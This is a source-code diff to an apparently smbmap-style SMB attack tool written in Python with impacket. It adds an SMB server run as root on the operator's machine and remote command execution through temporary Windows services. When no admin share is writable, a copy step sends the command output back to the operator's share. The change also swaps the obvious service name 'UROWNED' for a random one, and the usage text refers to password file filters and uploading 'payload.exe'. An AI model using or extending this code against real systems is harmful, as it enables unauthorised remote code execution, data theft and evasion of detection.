@@ -2,13 +2,16 @@ import sys
 import signal
 import string
 import time
+import random
+import string
 import logging
-from impacket import smb, version, smb3, nt_errors
+import ConfigParser
+from threading import Thread
+from impacket import smb, version, smb3, nt_errors, smbserver
 from impacket.dcerpc.v5 import samr, transport, srvs
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.smbconnection import *
 from impacket.dcerpc import transport, svcctl, srvsvc
-import argparse
 import ntpath
 import cmd
 import os
@@ -17,6 +20,65 @@ OUTPUT_FILENAME = '__output'
 BATCH_FILENAME  = 'execute.bat'
 SMBSERVER_DIR   = '__tmp'
 DUMMY_SHARE     = 'TMP'
+
+class SMBServer(Thread):
+    def __init__(self):
+        if os.geteuid() != 0:
+            exit('[!] Error: ** SMB Server must be run as root **')
+        Thread.__init__(self)
+
+    def cleanup_server(self):
+        print '[*] Cleaning up..'
+        try:
+            os.unlink(SMBSERVER_DIR + '/smb.log')
+        except:
+            pass
+        os.rmdir(SMBSERVER_DIR)
+
+    def run(self):
+        # Here we write a mini config for the server
+        smbConfig = ConfigParser.ConfigParser()
+        smbConfig.add_section('global')
+        smbConfig.set('global','server_name','server_name')
+        smbConfig.set('global','server_os','UNIX')
+        smbConfig.set('global','server_domain','WORKGROUP')
+        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
+        smbConfig.set('global','credentials_file','')
+
+        # Let's add a dummy share
+        smbConfig.add_section(DUMMY_SHARE)
+        smbConfig.set(DUMMY_SHARE,'comment','')
+        smbConfig.set(DUMMY_SHARE,'read only','no')
+        smbConfig.set(DUMMY_SHARE,'share type','0')
+        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)
+
+        # IPC always needed
+        smbConfig.add_section('IPC$')
+        smbConfig.set('IPC$','comment','')
+        smbConfig.set('IPC$','read only','yes')
+        smbConfig.set('IPC$','share type','3')
+        smbConfig.set('IPC$','path')
+
+        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
+        print '[*] Creating tmp directory'
+        try:
+            os.mkdir(SMBSERVER_DIR)
+        except Exception, e:
+            print e
+            pass
+        print '[*] Setting up SMB Server'
+        self.smb.processConfigFile()
+        print '[*] Ready to listen...'
+        try:
+            self.smb.serve_forever()
+        except:
+            pass
+
+    def stop(self):
+        self.cleanup_server()
+        self.smb.socket.close()
+        self.smb.server_close()
+        self._Thread__stop()
 
 class RemoteShell():
     def __init__(self, share, rpc, mode, serviceName, command):
@@ -35,18 +97,27 @@ class RemoteShell():
             dce.connect()
         except Exception, e:
             print e
+            exc_type, exc_obj, exc_tb = sys.exc_info()
+            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            print(exc_type, fname, exc_tb.tb_lineno)
             sys.exit(1)
 
         s = rpc.get_smb_connection()
 
         # We don't wanna deal with timeouts from now on.
         s.setTimeout(100000)
+        
         dce.bind(svcctl.MSRPC_UUID_SVCCTL)
         self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
         resp = self.rpcsvc.OpenSCManagerW()
         self.__scHandle = resp['ContextHandle']
         self.transferClient = rpc.get_smb_connection()
-        self.send_data(self.__command)
+
+    def set_copyback(self):
+        s = self.__rpc.get_smb_connection()
+        s.setTimeout(100000)
+        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
+        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
 
     def finish(self):
         # Just in case the service is still created
@@ -69,12 +140,20 @@ class RemoteShell():
     def get_output(self):
         def output_callback(data):
             self.__outputBuffer += data
-
-        self.transferClient.getFile(self.__share, self.__output, output_callback)
-        self.transferClient.deleteFile(self.__share, self.__output)
+        
+        if self.__mode == 'SHARE':
+            self.transferClient.getFile(self.__share, self.__output, output_callback)
+            self.transferClient.deleteFile(self.__share, self.__output)
+        else:
+            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
+            output_callback(fd.read())
+            fd.close()
+            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)
 
     def execute_remote(self, data):
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
+        if self.__mode == 'SERVER':
+            command += ' & ' + self.__copyBack
         command += ' & ' + 'del ' + self.__batchFile
 
         resp = self.rpcsvc.CreateServiceW(self.__scHandle, self.__serviceName, self.__serviceName, command.encode('utf-16le'))
@@ -107,7 +186,7 @@ class CMDEXEC:
         self.__username = username
         self.__password = password
         self.__protocols = [protocols]
-        self.__serviceName = 'UROWNED'.encode('utf-16le')
+        self.__serviceName = self.service_generator().encode('utf-16le')
         self.__domain = domain
         self.__lmhash = ''
         self.__nthash = ''
@@ -116,6 +195,9 @@ class CMDEXEC:
         self.__command = command
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
+
+    def service_generator(self, size=6, chars=string.ascii_uppercase):
+        return ''.join(random.choice(chars) for _ in range(size))
 
     def run(self, addr):
         for protocol in self.__protocols:
@@ -134,11 +216,26 @@ class CMDEXEC:
                 rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             try:
                 self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
+                self.shell.send_data(self.__command)
+            except SessionError as e:
+                print '[!] Non admin share, attempting to start SMB server to store output'
+                smb_server = SMBServer()
+                smb_server.daemon = True
+                smb_server.start()
+                self.__mode = 'SERVER'
+                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
+                self.shell.set_copyback()
+                self.shell.send_data(self.__command)
+                smb_server.stop() 
             except  (Exception, KeyboardInterrupt), e:
                 print e
+                exc_type, exc_obj, exc_tb = sys.exc_info()
+                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+                print(exc_type, fname, exc_tb.tb_lineno)
                 sys.stdout.flush()
                 sys.exit(1)
-
+           
+            
 class SMBMap():
 
     def __init__(self):
@@ -471,8 +568,8 @@ def usage():
     print '-d\t\tDomain name (default WORKGROUP)'
     print '-R\t\tRecursively list dirs, and files (no share\path lists ALL shares), ex. \'C$\\Finance\''
     print '-r\t\tList contents of root only'
-    print '-f\t\tFile name filter, -f "password"'
-    print '-F\t\tFile content filter, -f "password"'
+    print '-f\t\tFile name filter, -f "password" (feature pending)'
+    print '-F\t\tFile content filter, -f "password" (feature pending)'
     print '-D\t\tDownload path, ex. \'C$\\temp\\passwords.txt\''
     print '--upload-src\tFile upload source, ex \'/temp/payload.exe\'  (note that this requires --upload-dst for a destiation share)'
     print '--upload-dst\tUpload destination on remote host, ex \'C$\\temp\\payload.exe\''
